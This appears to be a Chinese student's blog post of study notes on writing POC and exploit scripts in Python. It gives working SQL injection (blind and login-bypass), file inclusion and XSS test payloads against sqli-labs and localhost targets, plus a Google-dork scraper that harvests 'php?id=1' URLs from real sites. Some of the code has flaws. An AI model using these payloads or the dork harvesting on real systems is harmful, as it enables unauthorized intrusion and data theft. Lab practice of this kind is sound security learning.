@@ -1,0 +1,291 @@
+本来按顺序应该先总结网络编程和爬虫的，但是学习了poc和exp，哇，帅的。。。原来之前我打的靶场可以这样玩儿。。今天的内容，概念性的内容很少，练习比较多，希望能跟着一起动手练练，会有很大的成就感和满足感的啦~~同样，本文只是小菜鸟的学习总结啦，如有错误，请大神赐教，小女子谢谢啦~
+
+## 0x00 POC概念
+
+POC (Proof of Concept)，
+直译为“概念证明”，百度百科的权威定义如下:“概念证明是证实发布的漏洞真实性的测试代码”。==》poc的要求：确定性，能够验证漏洞真实存在。
+
+它可能仅仅只是一小段代码，功能也比较简单，只要能够用来验证某一个或者一类漏洞真实存在即可。编写POC的门槛并不是很高，关键还是在于对漏洞本身的理解。
+
+## 0x01 POC编写框架
+
+POC框架可以对大量POC进行管理与调度，提供了统一的编程规范与接口，是编写POC很好的帮手。我们只需要按照框架自定义的格式写好POC.然后放在框架中运行即可。
+
+### 1\. Pocsuite
+
+Pocsuite框架现为知道创宇Seebug平台通用的漏洞验证框架，使用Python编写POC。可以提交POC换kb,
+kb可以用来兑换现金，挣点零花钱还是相当不错的。老司机们可能听过Sebug,那是Seebug的前身，
+2016年Sebug收购了另一个优秀框架Beebeeto后，更名为Seebug。
+
+### 2\. Tangscan
+
+Tangscan (唐朝扫描器)是wooyun社区的官方框架，使用Python编写POC。可以提交POC换汤圆，参与现金分红。
+
+### 3\. Bugscan
+
+Bugscan是四叶草的官方框架，使用Python编写POC。提交POC插件获取rank奖励，可兑换实物奖励，奖品还是蛮丰富的。
+
+## 0x02 POC和EXP区别
+
+POC可以看成是一段验证的代码， 就像是一个证据， 能够证明漏洞的真实性。
+
+EXP (Exploit)
+:中文直译为“漏洞利用”，简单点讲，就是通过EXP能够实现漏洞的利用价值。比如某个系统存在SQL注入漏洞，我们可以编写EXP来提取数据库版本信息等。
+
+但是有时两者也不太好区分。我们也可以在POC中加入Exploit的代码，现在很多开源的POC框架其实就是这样做的，比如下面会讲到的几个框架。我们可以这么认为：有POC不一定有EXP，但有EXP一定有POC。前半段是指，有poc但不一定所有都可以利用来完成有效攻击，所以不一定有exp。后半段是指，有可以用于进行有效攻击的漏洞那一定存在exp。
+
+## 0x03 POC、EXP盲注练习---sql-labs-master 第五关（私聊可发靶场）
+
+  1. 判断注入闭合方式
+
+> '''  
+> 布尔盲注：http://192.168.30.164/sqli/Less-5/  
+> 判断是否存在单引号闭合的sql注入  
+> poc编写：结果有或者没有  
+> '''  
+> import requests
+>
+> def verify(url):  
+>  payload1 = "?id=1' and 1=1 --+"  
+>  payload2 = "?id=1' and 1=2 --+"  
+>  resp1 = requests.get(url+payload1)  
+>  resp2 = requests.get(url+payload2)
+>
+> text1 = resp1.text  
+>  text2 = resp2.text  
+>  print(text2)  
+>  if ('You are in' in text1) and ('You are in' not in text2):  
+>  print(url,'：存在单引号闭合的sql注入（盲注）')  
+>  else:  
+>  print(url,'：不存在单引号闭合的sql注入（盲注）')  
+> verify('http://192.168.30.164/sqli/Less-5/')
+
+2.判断数据库长度 ==》数据库名字最长为64 数据表名字最长为64 字段名字最长为64
+
+> import requests
+>
+> def verify(url):  
+>  for i in range(1,20):  
+>  payload1 = "?id=1' and length(database())={} --+".format(i)  
+>  resp1 = requests.get(url+payload1)  
+>  text1 = resp1.text  
+>  if 'You are in' in text1:  
+>  print('database长度为：%s'%i)  
+>  break  
+> if __name__=='__main__':  
+>  url = "http://192.168.30.164/sqli/Less-5/"  
+>  verify(url)
+
+3.判断数据库名
+
+> '''  
+> exp的小练习啦  
+> 布尔盲注：http://192.168.30.164/sqli/Less-5/  
+> You are in  
+> '''
+>
+> import requests
+>
+> def verify(url):  
+>  # length = []  
+>  for i in range(1,8):  
+>  list = 'abcdefghijklmnopqrstuvwxyz'  
+>  for k in range(1,26):  
+>  j = list[k]  
+>  # payload1 = "?id=1' and length(database())={} --+".format(i)  
+>  payload1 = "?id=1' and substr(database(),{},1)='{}' --+".format(i,j)  
+>  resp1 = requests.get(url+payload1)  
+>  text1 = resp1.text  
+>  if 'You are in' in text1:  
+>  print('database为：%s'%j)  
+>  break
+>
+> if __name__=='__main__':  
+>  url = "http://192.168.30.164/sqli/Less-5/"  
+>  verify(url)
+>
+> # j = input('请输入想玩耍关卡：')  
+> # verify('http://192.168.30.164/sqli/Less-{}/'.format(j))  
+> # verify('http://192.168.30.164/sqli/Less-5/')
+
+## 0x04 POC的post型练习---sql-labs-master 第十一关
+
+post型的SQL注入，需要在获取其url的基础上再获取表单中传的值，具体可通过burpsuite来抓包进行分析获得。在python中将所传的值放入请求以键值对的形式上传。
+
+> '''  
+> Post poc  
+> http://192.168.30.164/sqli/Less-11/  
+> '''  
+> import requests
+>
+> url = "http://192.168.30.164/sqli/Less-11/"  
+> payloads = "admin' or '1'='1 #"  
+> response = requests.post(url,data={'uname':payloads,'passwd':123})  
+> html = response.text  
+> print(html)  
+> if 'Your Login name' in html:  
+>  print('Post注入')
+
+## 0x05 POC的文件包含练习
+
+文件包含：
+
+  * 本地文件包含 =》http://127.0.0.1/1/lfi.php?file=phpinfo.txt
+  * 远程文件包含 =》需要开启 allow_url_include,默认是off。远程文件包含?file=http://远程文件地址
+
+> """  
+> 文件包含 poc  
+> <http://127.0.0.1/1/lfi.php?file=phpinfo.txt>  
+> """  
+> import requests
+>
+> def verify(url):  
+>  payload = '?file=phpinfo.txt'  
+>  reaponse = requests.get(url+payload)  
+>  html_str = reaponse.text  
+>  if 'PHP Version' in html_str:  
+>  print('存在本地文件包含')  
+>  else:  
+>  print('不存在')  
+> if __name__ == '__main__':  
+>  verify(url="http://127.0.0.1/1/lfi.php")
+
+## 0x06 POC的XSS练习
+
+XSS是除SQL注入外第二大的漏洞，类别有：反射型XSS，存储型XSS，DOM型XSS。
+
+XSS可以做什么：
+
+  * 蠕虫 ==》帅的一批
+  * 获取cookie
+  * 获取被攻击者真实ip：javascript 本身不具备此功能
+  * 识别用户安装的软件
+  * XSS钓鱼
+  * 截图
+  * 键盘记录
+  * 访问浏览器的访问记录
+  * 内网扫描
+
+> """  
+> xss跨站脚本攻击  
+> 弹窗  
+>
+> http://127.0.0.1/1/xss.php?title=%3C/title%3E%3Cscript%3Ealert(123)%3C/script%3E  
+> """  
+> import requests  
+> import re  
+> def POC():  
+>  response =
+> requests.get('http://127.0.0.1/1/xss.php?title=</title><script>alert(123)</script>')  
+>  res = response.text  
+>  if re.search('alert\\(123\\)',res):  
+>  return True  
+>  else:  
+>  return False  
+> if __name__ == '__main__':  
+>  print(POC())
+
+## 0x07 谷歌语法：通过inurl=php?id=1来搜索出可能含有注入点的网站
+
+### 1.谷歌语法
+
+site：可以限制你搜索范围的域名.
+
+inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.
+
+intext: 只搜索网页<body>部分中包含的文字(也就是忽略了标题、URL等的文字)
+
+intitle: 查包含关键词的页面，一般用于社工别人的webshell密码
+
+filetype：搜索文件的后缀或者扩展名
+
+intitle：限制你搜索的网页标题.
+
+link: 可以得到一个所有包含了某个指定URL的页面列表.
+
+### 2.google语法模拟点击
+
+> """  
+> selenium爬虫  
+> 1.通过google语法批量获取 php?id=1 d的url  
+> 2.url存到文件中：urls.txt  
+> """
+>
+> from selenium import webdriver  
+> import time  
+> import re
+>
+> # #设置无头  
+> # chrome_option =
+>
+> dirver = webdriver.Chrome(r'G:\python\file\chromedriver.exe')
+> #创建谷歌浏览器对象，打开谷歌浏览器  
+> dirver.get('https://www.google.com/search?q=inurl:php?id=1')
+>
+> for i in range(10):  
+>  time.sleep(1.5)  
+>  dirver.execute_script('window.scrollTo(0,document.body.scrollHeight)')  
+>  html_str = dirver.page_source # 获取源码  
+>  #数据解析  
+>  # test = dirver.find_element_by_xpath('//a[@id="pnnext"]/span[2]')  
+>  pattern = re.compile('<div class="r"><a href="(.*?)"',re.S)  
+>  #点击下一页  
+>  # test = dirver.find_element_by_link_text('下一页')  
+>  test = dirver.find_element_by_class_name('r')[0] #定位到一个元素  
+>  result = re.findall(pattern,html_str)  
+>  test.click() # 模拟点击  
+>  print(result)
+>
+> dirver.close() #关闭浏览器
+
+## 0x08 Selenium实现模拟登录
+
+### 1.selenium
+
+selenium
+是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。selenium的核心Selenium
+Core基于JsUnit，完全由JavaScript编写，因此可以用于任何支持JavaScript的浏览器上。selenium可以模拟真实浏览器，自动化测试工具，支持多种浏览器，爬虫中主要用来解决JavaScript渲染问题。
+
+### 2.selenium实现模拟登录
+
+> """  
+> selenium实现模拟登录  
+> """  
+> from selenium import webdriver  
+> import time  
+> driver = webdriver.Chrome() #Chrome()是一个对象来着  
+> url = 'http://192.168.30.164/sqli/Less-11/'  
+> driver.get(url)  
+> print(driver.page_source)
+>
+> username =
+> driver.find_element_by_xpath('/html/body/div[2]/div/form/div[1]/input')  
+> password =
+> driver.find_element_by_xpath('/html/body/div[2]/div/form/div[2]/input')  
+> submit = driver.find_element_by_xpath('//form/div[3]/input')
+> #双斜杠指从任意位置到当前的位置
+>
+> username.clear()  
+> username.send_keys('admin')  
+> time.sleep(1)  
+> password.clear()  
+> password.send_keys('admin')  
+> time.sleep(1)  
+> submit.click()  
+> time.sleep(5)
+>
+> driver.close()
+
+## 0x09 参考文章
+
+关于selenium的详细使用可参见 <https://www.jianshu.com/p/3aa45532e179>
+
+关于POC、EXP的区别详细请参见
+<https://blog.csdn.net/weixin_43625577/article/details/92643949>
+
+关于谷歌语法的详细使用请参加 <https://blog.csdn.net/xxx0028/article/details/105818546>
+
+## 0x0A 总结
+
+python真的是一门很有魅力很有意思的语言，学习的时候充满了惊喜，眼里放着光~~呐~~~希望你也能够一起练习一下啦~~冲冲冲。。。另外，有没有小哥哥小姐姐能推荐一些应急响应的学习资料呀~~不甚感激。
+
